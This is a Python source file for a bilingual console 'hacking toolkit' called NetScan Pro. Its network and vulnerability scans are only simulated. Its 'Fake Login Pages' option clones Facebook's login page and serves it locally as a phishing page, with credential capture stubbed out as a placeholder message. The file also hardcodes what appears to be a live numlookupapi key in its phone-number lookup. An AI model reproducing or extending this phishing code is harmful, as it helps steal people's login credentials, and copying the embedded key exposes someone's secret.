import os
import subprocess
import requests
import time
import threading
import http.server
import socketserver
import webbrowser
import numbers
import numlookupapi
from colorama import init, Fore, Style

# Porta para o servidor HTTP local
PORT = 8000

# Diretório onde os arquivos HTML e CSS serão armazenados
HTML_CSS_DIR = 'html_css'

# URL da página alvo para clonagem
TARGET_URL = "https://facebook.com/login.php"

# Variável para verificar se a página já foi clonada
page_cloned = False

# Função para limpar a tela do console
def clear_console():
    """Clears the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

# Função para exibir a mensagem de boas-vindas
def welcome_message(language):
    clear_console()
    if language == '1':
        print(Fore.GREEN + Style.BRIGHT + "Welcome to the NetScan Pro tool!".center(50))
    else:
        print(Fore.GREEN + Style.BRIGHT + "Bem-vindo à ferramenta NetScan Pro!".center(50))
    print()
    time.sleep(2)
    clear_console()

# Função para exibir a mensagem de despedida
def goodbye_message(language):
    clear_console()
    if language == '1':
        print(Fore.GREEN + Style.BRIGHT + "Thank you for using NetScan Pro tool!".center(50))
    else:
        print(Fore.GREEN + Style.BRIGHT + "Obrigado por usar a ferramenta NetScan Pro!".center(50))
    time.sleep(3)
    print()

# Função para lidar com opções inválidas
def handle_invalid_option(language):
    clear_console()
    if language == '1':
        print(Fore.RED + "Invalid option. Please choose again.")
    else:
        print(Fore.RED + "Opção inválida. Por favor, escolha novamente.")
    time.sleep(2)

# Função para exibir a mensagem de carregamento
def loading_screen():
    print("Loading...")
    time.sleep(3)
    clear_console()
    print(Style.BRIGHT + "@wbrunnno".center(100))
    time.sleep(1)

# Função para atualizar a ferramenta do GitHub
def update_tool_from_github(language):
    clear_console()
    print(Fore.YELLOW + Style.BRIGHT + "Updating NetScan Pro tool from GitHub...")

    try:
        # Atualização usando Git
        subprocess.run(["git", "pull", "https://github.com/WeverttonBruno/NetScanPro.git"])
        print("NetScan Pro tool has been updated successfully!")

        # Reiniciando a ferramenta após a atualização
        print("Restarting NetScan Pro tool...")
        time.sleep(2)
        clear_console()
        print("NetScan Pro tool has been updated and restarted.")

        time.sleep(2)
    except Exception as e:
        print(Fore.RED + f"Error updating the tool: {e}")

    # Retorna ao menu principal após a atualização
    time.sleep(3)
    main_menu(language)

# Função para exibir o menu principal
def main_menu(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Main Menu ".center(50, '-'))
            print("1. Network Tools")
            print("2. Social Engineering Tools")
            print("3. Update Tool")
            print("0. Exit")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Menu Principal ".center(50, '-'))
            print("1. Ferramentas de Rede")
            print("2. Ferramentas de Engenharia Social")
            print("3. Atualizar Ferramenta")
            print("0. Sair")

        choice = input("Choose an option: ")

        if choice == '0':
            goodbye_message(language)
            break
        elif choice == '1':
            network_tools_menu(language)
        elif choice == '2':
            social_engineering_tools(language)
        elif choice == '3':
            update_tool_from_github(language)
        else:
            handle_invalid_option(language)

# Função para o menu de ferramentas de rede
def network_tools_menu(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Network Tools ".center(50, '-'))
            print("1. Scan a Network")
            print("2. Scan Own Network")
            print("3. Vulnerability Scanning")
            print("0. Back to Main Menu")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Ferramentas de Rede ".center(50, '-'))
            print("1. Escanear uma Rede")
            print("2. Escanear a Própria Rede")
            print("3. Escaneamento de Vulnerabilidades")
            print("0. Voltar ao Menu Principal")

        choice = input("Choose an option: ")

        if choice == '0':
            return
        elif choice == '1':
            enter_network(language)
            manual_mode(language)
        elif choice == '2':
            scan_own_network(language)
        elif choice == '3':
            vulnerability_scan_mode(language)
        else:
            handle_invalid_option(language)

# Função para entrar com o nome da rede
def enter_network(language):
    clear_console()
    if language == '1':
        return input("Enter the network name: ")
    else:
        return input("Digite o nome da rede: ")

# Função para o modo manual
def manual_mode(language):
    clear_console()
    if language == '1':
        print("Scanning network in manual mode...")
    else:
        print("Escanenado rede no modo manual...")

    # Lógica para o modo manual (simulado)
    time.sleep(3)
    input("Press Enter to continue...")

# Função para escanear a própria rede
def scan_own_network(language):
    clear_console()
    if language == '1':
        print("Scanning own network...")
    else:
        print("Escanenando a própria rede...")

    # Lógica para escanear a própria rede (simulado)
    time.sleep(3)
    input("Press Enter to continue...")

# Função para o escaneamento de vulnerabilidades
def vulnerability_scan_mode(language):
    clear_console()
    if language == '1':
        print("Vulnerability scanning...")
    else:
        print("Escaneamento de vulnerabilidades...")

    # Lógica para o escaneamento de vulnerabilidades (simulado)
    time.sleep(3)
    input("Press Enter to continue...")

# Função para o menu de ferramentas de engenharia social
def social_engineering_tools(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Social Engineering Tools ".center(50, '-'))
            print("1. Phone Number Information")
            print("2. Phishing")
            print("0. Back to Main Menu")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Ferramentas de Engenharia Social ".center(50, '-'))
            print("1. Informações de Número de Telefone")
            print("2. Phishing")
            print("0. Voltar ao Menu Principal")

        choice = input("Choose an option: ")

        if choice == '0':
            return
        elif choice == '1':
            phone_number_info(language)
        elif choice == '2':
            phishing_menu(language)
        else:
            handle_invalid_option(language)

# Função para o submenu de phishing
def phishing_menu(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Phishing Menu ".center(50, '-'))
            print("1. Fake Login Pages")
            print("0. Back to Social Engineering Tools")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Menu de Phishing ".center(50, '-'))
            print("1. Páginas de Logins Falsas")
            print("0. Voltar para Ferramentas de Engenharia Social")

        choice = input("Choose an option: ")

        if choice == '0':
            return
        elif choice == '1':
            fake_login_pages(language)
        else:
            handle_invalid_option(language)

# Função para as páginas de logins falsas
def fake_login_pages(language):
    global page_cloned

    clear_console()
    if language == '1':
        print("Cloning Facebook for fake login...")
    else:
        print("Clonando Facebook para login falso...")

    try:
        if not page_cloned:
            # Baixar HTML e CSS da página alvo
            response = requests.get(TARGET_URL)
            if response.status_code == 200:
                html_content = response.text
                # Salvar HTML localmente
                with open(os.path.join(HTML_CSS_DIR, 'fake_login_page.html'), 'w', encoding='utf-8') as f:
                    f.write(html_content)
                print("Página clonada com sucesso!")
                page_cloned = True

                # Iniciar servidor HTTP local para servir a página clonada
                start_http_server(language)

                # Simular mensagem de credenciais digitadas em um novo terminal
                open_new_terminal(language)

                # Redirecionar para a página oficial do Facebook após simulação
                print("Redirecting to official Facebook page...")
                time.sleep(3)  # Simulando redirecionamento
                webbrowser.open("https://facebook.com")
                input("\nPressione Enter para continuar...")
            else:
                print(Fore.RED + "Erro ao clonar página: HTTP status code", response.status_code)
        else:
            # Página já clonada, mensagem de aviso
            if language == '1':
                print("Fake login page already cloned.")
            else:
                print("Página de login falso já clonada.")
            input("\nPressione Enter para continuar...")

    except Exception as e:
        print(Fore.RED + f"Erro ao clonar página: {e}")

    input("\nPressione Enter para continuar...")

# Função para iniciar o servidor HTTP local
def start_http_server(language):
    try:
        # Configurar e iniciar servidor HTTP local para servir arquivos HTML e CSS
        os.chdir(HTML_CSS_DIR)
        Handler = http.server.SimpleHTTPRequestHandler

        with socketserver.TCPServer(("", PORT), Handler) as httpd:
            if language == '1':
                print(Fore.GREEN + f"Servidor HTTP local iniciado em http://localhost:{PORT}")
                print("Pressione Ctrl+C para encerrar o servidor.")
            else:
                print(Fore.GREEN + f"Local HTTP server started at http://localhost:{PORT}")
                print("Press Ctrl+C to terminate the server.")
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                pass
    except Exception as e:
        print(Fore.RED + f"Erro ao iniciar servidor HTTP local: {e}")

# Função para exibir as credenciais digitadas em um novo terminal
def open_new_terminal(language):
    try:
        # Simular mensagem de credenciais digitadas
        print("Credentials entered here...")
        time.sleep(3)
    except Exception as e:
        print(Fore.RED + f"Erro ao abrir novo terminal: {e}")

# Função para informações de número de telefone
def phone_number_info(language):
    clear_console()
    if language == '1':
        print("Phone Number Information")
        print("Enter a phone number to obtain information (Country Code + Carrier area code):")
    else:
        print("Informações de Número de Telefone")
        print("Digite um número de telefone para obter informações(Código do País + DDD da operadora):")

    phone_number = input("Phone number: ")

    # Consulta à API numlookupapi para obter informações detalhadas
    try:
        client = numlookupapi.Client('num_live_nPxUn5CQCi43HYw85qiaohr9FvykkoqCa1x8QkEy')  # Substitua 'YOUR-API-KEY' pelo seu API key
        result = client.validate(phone_number)
        
        # Formatando a resposta no estilo desejado
        print("\nInformation for phone number", phone_number)
        print("Valid:", result.get("valid", False))
        print("Number:", result.get("number", ""))
        print("Local Format:", result.get("local_format", ""))
        print("International Format:", result.get("international_format", ""))
        print("Country Prefix:", result.get("country_prefix", ""))
        print("Country Code:", result.get("country_code", ""))
        print("Country Name:", result.get("country_name", ""))
        print("Location:", result.get("location", ""))
        print("Carrier:", result.get("carrier", ""))
        print("Line Type:", result.get("line_type", ""))

    except Exception as e:
        print(Fore.RED + f"Error fetching phone number information: {e}")

    input("\nPress Enter to continue...")

# Função principal para iniciar o programa
def start_program():
    init(autoreset=True)
    language = input("Choose language (1. English / 2. Portuguese): ")

    if language not in ['1', '2']:
        print("Invalid choice. Defaulting to English.")
        language = '1'

    welcome_message(language)
    main_menu(language)

# Início do programa
if __name__ == "__main__":
    start_program()
